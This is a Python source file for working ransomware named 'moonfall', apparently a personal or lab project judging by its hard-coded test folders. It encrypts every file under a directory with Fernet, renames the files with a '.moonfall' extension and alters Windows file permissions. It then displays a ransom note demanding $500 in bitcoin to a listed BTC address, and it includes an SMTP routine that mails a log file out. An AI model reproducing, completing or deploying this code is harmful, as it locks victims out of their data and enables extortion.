import os
from cryptography.fernet import Fernet
import PySimpleGUI as sg
import win32security
import ntsecuritycon as con
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import datetime
import oschmod

brand_name = '.moonfall'

extension_list = ['.pdf', '.doc', '.docx', '.xls',
                  '.xslx', '.ppt', '.pptx', '.pages']  # TODO

protected_folders = ['PerfLogs', 'Windows', 'Internet Explorer']  # TODO


"""
Send password by mail as a feature
"""
def send_mail(sender, sender_password, reciever):
    server = 'smtp.gmail.com'
    port = 587

    date = datetime.datetime.now()
    date = date.strftime("%c")

    msg = MIMEMultipart("alternative")
    msg["Subject"] = 'Log of ' + date
    msg["From"] = sender
    msg["To"] = reciever

    msg.attach(MIMEText('Download the file', 'plain'))
    attach_file_name = 'log.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)  # encode the attachment

    payload.add_header('Content-Decomposition',
                       'attachment', filename=attach_file_name)
    msg.attach(payload)

    s = smtplib.SMTP(server, port)
    s.ehlo()
    s.starttls()
    s.login(sender, sender_password)
    s.sendmail(sender, reciever, msg.as_string())
    s.quit()


def write_key():
    key = Fernet.generate_key()

    with open('key.key', 'wb') as key_file:
        key_file.write(key)


def load_key():
    return open("key.key", "rb").read()


def save_data(filename, data, opt='add_ext'):
    if os.access(filename, os.W_OK):
        oschmod.set_mode(filename, "a+rwx,g-w,o-x") #TODO repasar permisos
    with open(filename, 'wb') as file:
        file.write(data)
    file.close()

    if opt == 'add_ext':
        os.rename(filename, filename + brand_name)
    elif opt == 'del_ext':
        os.rename(filename, filename[:-len(brand_name)]) # TODO hay un problema con el añadir y eliminar la extension
    else:
        raise ValueError('Invalid argument')


def load_data(filename):
    if not os.access(filename, os.R_OK):
        oschmod.set_mode(filename, "a+rwx,g-w,o-x")
    with open(filename, 'rb') as file:
        return file.read()

def encrypt_or_decrypt(filename, key, opt='encrypt'):
    try:
        f = Fernet(key)
        data = load_data(filename)
        if opt == 'encrypt':
            encrypted_data = f.encrypt(data)
            save_data(filename, encrypted_data)
        elif opt == 'decrypt':
            decrypted_data = f.decrypt(data)
            save_data(filename, decrypted_data, 'del_ext')
        else:
            raise ValueError('Invalid argument')

    except ValueError as ve:
        if opt == 'decrypt':
            sg.theme('DarkPurple5')
            sg.Popup('Wrong key', keep_on_top=True, no_titlebar=True)
            raise Exception('Wrong key')
        else:
            print(ve)


"""
Deberia devolver los permisos correspondientes?
"""
def modify_permissions(filename):
    userx, domain, type = win32security.LookupAccountName(os.getlogin(), "Everyone")
    sd = win32security.GetFileSecurity(
        filename, win32security.DACL_SECURITY_INFORMATION)
    dacl = sd.GetSecurityDescriptorDacl()   # instead of dacl = win32security.ACL()
    dacl.AddAccessAllowedAce(win32security.ACL_REVISION,
                             con.FILE_ALL_ACCESS, userx)
    sd.SetSecurityDescriptorDacl(1, dacl, 0)
    win32security.SetFileSecurity(
        filename, win32security.DACL_SECURITY_INFORMATION, sd)


if __name__ == '__main__':
    write_key()
    key = load_key()

    root = 'C:/'
    root_osx = '/Users/marcosplazagonzalez/Desktop/test'
    root_win = 'C:/Users/marco/OneDrive/Escritorio/test'
    root_vm_win = 'C:/Users/IEUser/test/'

    # ITERATE AND ENCRYPT
    for root, dirs, files in os.walk(root_win):
        # if dirs in protected_folders:
        # continue
        for fn in files:
            full_path = root + os.sep + fn
            encrypt_or_decrypt(full_path, key)

    print("All data was encrypted successfully ;)")

    # RANSOM NOTE
    sg.theme('DarkRed2')
    layout = [	[sg.Text('Attention your files have been encrypted under a strong\n encryption algorithm called AES-256', font='Helvetica 18')],
               [sg.Text('')],
               [sg.Text('How can I recover my files?', font='bold')],
               [sg.Text('You must have to pay the 500$ ransom in bitcoins.',
                        font='Helvetica 13')],
               [sg.Text('Once you do the payment, we will send the decryption key via mail.',
                        font='Helvetica 13')],
               [sg.Text(
                   'Payment must be done through Bitcoin wallet to the following BTC address:', font='Helvetica 13')],
               [sg.Text('1BhKDQDY55XMPqnSUDtCMCG8R6UX7CSbzP', font='bold')],
               [sg.Text('')],
               [sg.Text('')],
               [sg.Text(
                   'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
               [sg.InputText()],
               [sg.Text('')],
               [sg.Button('Decrypt files')]]

    window = sg.Window('Title', layout, no_titlebar=True,
                       keep_on_top=True, element_justification='c')

    count = 0

    while True:
        try:
            event, values = window.read()
            key = values[0]

            # ITERATE AND DECRYPT
            for root, dirs, files in os.walk(root_win):
                # if dirs in protected_folders:
                # continue
                for fn in files:
                    full_path = root + os.sep + fn
                    try:
                        encrypt_or_decrypt(full_path, key, opt='decrypt')
                        count += 1
                    except Exception as e:
                        print(e)
                        break
            if count > 0:
                break
        except Exception as e:
            print(e)

    window.close()

    sg.theme('DarkPurple5')
    sg.Popup("All data was decrypted successfully. Be careful on the internet next time ;)",
             keep_on_top=True, no_titlebar=True)
